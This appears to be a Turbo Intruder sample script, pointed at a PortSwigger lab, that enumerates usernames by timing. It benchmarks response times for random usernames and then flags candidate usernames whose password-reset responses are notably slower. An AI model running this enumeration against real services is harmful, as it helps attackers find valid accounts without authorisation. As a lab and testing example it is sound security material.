# You can test this code on http://portswigger-labs.net/password_reset.php?username=%s
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           requestsPerConnection=100
                           )

    engine.userState['base_times'] = []

    for i in range(20):
        engine.queue(target.req, randstr(i), label='benchmark')

    usernames = ['test', 'foo', 'albinowax', 'bar']

    for username in usernames:
        engine.queue(target.req, username)


def handleResponse(req, interesting):
    if req.label == 'benchmark':
        req.engine.userState['base_times'].append(req.time)

    elif req.time > max(req.engine.userState['base_times'])+10:
        table.add(req)
